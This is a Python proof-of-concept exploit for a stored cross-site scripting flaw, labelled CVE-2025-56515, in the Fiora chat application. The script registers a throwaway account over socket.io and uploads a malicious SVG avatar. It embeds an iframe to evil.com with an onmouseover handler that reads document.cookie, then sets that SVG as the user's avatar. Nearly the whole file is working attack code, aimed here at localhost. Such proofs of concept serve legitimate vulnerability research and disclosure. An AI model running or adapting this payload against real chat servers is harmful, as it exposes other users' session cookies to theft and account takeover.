#!/usr/bin/env python3
import socketio
import time
import uuid
import sys

TARGET_URL = "http://localhost:9200"

MALICIOUS_SVG = '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">
  <foreignObject x="0" y="0" width="100" height="100">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.com" onmouseover="alert(document.cookie)" width="100" height="100"></iframe>
  </foreignObject>
  <text x="0" y="15"></text>
</svg>'''

sio = socketio.Client()

result = {
    "registered": False,
    "uploaded": False,
    "avatar_changed": False,
    "avatar_url": None,
    "user_info": None
}


def emit_and_wait(event, data, timeout=10):
    response = {"data": None, "received": False}
    
    def callback(res):
        response["data"] = res
        response["received"] = True
    
    sio.emit(event, data, callback=callback)
    
    start = time.time()
    while not response["received"] and time.time() - start < timeout:
        time.sleep(0.1)
    
    return response["data"]


def register_user(username, password):
    print(f"[*] Registering user: {username}")
    data = {
        "username": username,
        "password": password,
        "os": "Linux",
        "browser": "Chrome",
        "environment": "web"
    }
    res = emit_and_wait("register", data)
    if res and isinstance(res, dict) and "_id" in res:
        print(f"[+] Registration successful. User ID: {res['_id']}")
        result["registered"] = True
        result["user_info"] = res
        return res
    else:
        print(f"[-] Registration failed: {res}")
        return None


def login_user(username, password):
    print(f"[*] Logging in as: {username}")
    data = {
        "username": username,
        "password": password,
        "os": "Linux",
        "browser": "Chrome",
        "environment": "web"
    }
    res = emit_and_wait("login", data)
    if res and isinstance(res, dict) and "_id" in res:
        print(f"[+] Login successful. User ID: {res['_id']}")
        result["registered"] = True
        result["user_info"] = res
        return res
    else:
        print(f"[-] Login failed: {res}")
        return None


def upload_malicious_svg():
    print("[*] Uploading malicious SVG file...")
    filename = f"avatar/{uuid.uuid4().hex}.svg"
    svg_bytes = MALICIOUS_SVG.encode('utf-8')
    
    data = {
        "fileName": filename,
        "file": svg_bytes
    }
    
    res = emit_and_wait("uploadFile", data)
    if res and isinstance(res, dict) and "url" in res:
        print(f"[+] SVG uploaded successfully: {res['url']}")
        result["uploaded"] = True
        result["avatar_url"] = res["url"]
        return res["url"]
    else:
        print(f"[-] Upload failed: {res}")
        return None


def change_avatar(avatar_url):
    print(f"[*] Changing avatar to: {avatar_url}")
    data = {"avatar": avatar_url}
    res = emit_and_wait("changeAvatar", data)
    if res == {} or (isinstance(res, dict) and not res.get("error")):
        print("[+] Avatar changed successfully")
        result["avatar_changed"] = True
        return True
    else:
        print(f"[-] Avatar change failed: {res}")
        return False


def verify_xss():
    print("\n" + "="*60)
    print("[*] VULNERABILITY VERIFICATION")
    print("="*60)
    
    if result["uploaded"] and result["avatar_url"]:
        full_url = TARGET_URL + result["avatar_url"]
        print(f"[+] Malicious SVG URL: {full_url}")
        print("[+] The SVG file contains:")
        print("    - foreignObject with iframe")
        print("    - onmouseover event handler")
        print("")
        print("[*] To verify manually:")
        print(f"    1. Open browser and navigate to: {full_url}")
        print(f"    2. Or view user profile at: {TARGET_URL}")
        return True
    else:
        print("[-] Could not verify XSS - upload may have failed")
        return False


@sio.event
def connect():
    print(f"[+] Connected to {TARGET_URL}")


@sio.event
def disconnect():
    print("[*] Disconnected from server")


def main():
    print("="*60)
    print("CVE-2025-56515 - Fiora Chat SVG XSS PoC")
    print("="*60)
    
    username = f"xsstest{uuid.uuid4().hex[:6]}"
    password = "testpassword123"
    
    try:
        print(f"[*] Connecting to {TARGET_URL}...")
        sio.connect(TARGET_URL, transports=['websocket'])
        time.sleep(1)
        
        user = register_user(username, password)
        if not user:
            user = login_user(username, password)
        
        if not user:
            print("[-] Failed to authenticate")
            return False
        
        avatar_url = upload_malicious_svg()
        if avatar_url:
            change_avatar(avatar_url)
        
        success = verify_xss()
        
        print("\n" + "="*60)
        print("[*] SUMMARY")
        print("="*60)
        print(f"    Registered/Logged in: {result['registered']}")
        print(f"    SVG Uploaded: {result['uploaded']}")
        print(f"    Avatar Changed: {result['avatar_changed']}")
        print(f"    Avatar URL: {result['avatar_url']}")
        
        with open("result.log", "w") as f:
            f.write("CVE-2025-56515 - Fiora Chat SVG XSS PoC Result\n")
            f.write("="*60 + "\n")
            f.write(f"Target: {TARGET_URL}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Registered/Logged in: {result['registered']}\n")
            f.write(f"SVG Uploaded: {result['uploaded']}\n")
            f.write(f"Avatar Changed: {result['avatar_changed']}\n")
            f.write(f"Avatar URL: {result['avatar_url']}\n")
            if result['avatar_url']:
                f.write(f"Full URL: {TARGET_URL}{result['avatar_url']}\n")
            f.write("\nMalicious SVG Content:\n")
            f.write(MALICIOUS_SVG)
            f.write("\n")
        
        print(f"\n[*] Results written to result.log")
        
        return success
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        if sio.connected:
            sio.disconnect()


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
